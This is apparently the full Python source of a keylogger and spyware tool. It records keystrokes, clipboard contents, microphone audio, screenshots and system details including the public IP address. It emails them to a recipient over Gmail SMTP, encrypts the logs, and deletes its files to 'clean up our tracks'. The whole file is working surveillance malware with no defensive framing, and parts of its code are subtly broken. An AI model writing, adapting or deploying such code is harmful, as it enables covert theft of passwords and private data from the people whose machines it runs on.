# Libraries
import smtplib
from email.message import EmailMessage
import ssl
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab


def send_email(filename, attachment, from_addr, to_addr):
    msg = EmailMessage()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Log File"

    msg.set_content(subject)

    with open(attachment, 'rb') as f:
        file_data = f.read()

    msg.add_attachment(file_data, maintype='text', subtype='plain', filename=filename)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(from_addr, password)
        smtp.sendmail(from_addr, to_addr, msg.as_string())


def computer_information(path):
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')


def copy_clipboard(path):
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + "\n")

        except:
            f.write("Clipboard could not be copied")


def microphone(path):
    fs = 44100
    seconds = microphone_time

    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(path, fs, my_recording)


def screenshot(path):
    im = ImageGrab.grab()
    im.save(path)


def on_press(key):
    global keys, count, current_time

    print(key)
    keys.append(key)
    count += 1
    current_time = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_merge + keys_information, "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            # look for space in string
            if k.find("space") > 0:
                file.write('\n')
                file.close()
            elif k.find("Key") == -1:
                file.write(k)
                file.close()


def on_release(key):
    if key == Key.esc:
        return False
    if current_time > stopping_time:
        return False


if __name__ == "__main__":
    keys_information = "key_log.txt"
    system_information = "systems.txt"
    clipboard_information = "clipboard.txt"
    audio_information = "audio.wav"
    screenshot_information = "screenshot.png"

    # Encrypted files
    keys_information_e = "e_key_log.txt"
    system_information_e = "e_systems.txt"
    clipboard_information_e = "e_clipboard.txt"

    file_path = ""
    extend = "\\"
    file_merge = file_path + extend

    # Email information
    subject = "Log File"
    sender_email = ""
    password = ""
    recipient_email = ""

    # Encryption key
    key2 = ""

    microphone_time = 10
    time_iteration = 15
    num_iterations_end = 3

    # Collect system, clipboard, mic, and screen information
    computer_information(file_merge + system_information)
    copy_clipboard(file_merge + clipboard_information)
    microphone(file_merge + audio_information)
    send_email(audio_information, file_merge + audio_information, sender_email, recipient_email)
    screenshot(file_merge + screenshot_information)

    num_iterations = 0
    current_time = time.time()
    stopping_time = time.time() + time_iteration

    # Timer for keylogger
    while num_iterations < num_iterations_end:
        count = 0
        keys = []

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if current_time > stopping_time:
            send_email(keys_information, file_merge + keys_information, sender_email, recipient_email)

            with open(file_path + extend + keys_information, "w") as f:
                f.write(" ")

            screenshot(file_merge + screenshot_information)
            send_email(screenshot_information, file_merge + screenshot_information, sender_email,
                       recipient_email)

            copy_clipboard(file_merge + clipboard_information)

            # Reset timer
            num_iterations += 1
            current_time = time.time()
            stopping_time = time.time() + time_iteration

    # Encrypt files
    files_to_encrypt = [system_information, clipboard_information,
                        keys_information]
    encrypted_file_names = [system_information_e, clipboard_information_e,
                            keys_information_e]

    count = 0
    for encrypting_file in files_to_encrypt:
        with open(file_merge + files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key2)
        encrypted = fernet.encrypt(data)

        with open(file_merge + encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)

        send_email(encrypted_file_names[count], file_merge + encrypted_file_names[count], sender_email, recipient_email)
        count += 1

    time.sleep(120)

    # Clean up our tracks and delete files
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information,
                    audio_information]
    for file in delete_files:
        os.remove(file_merge + file)
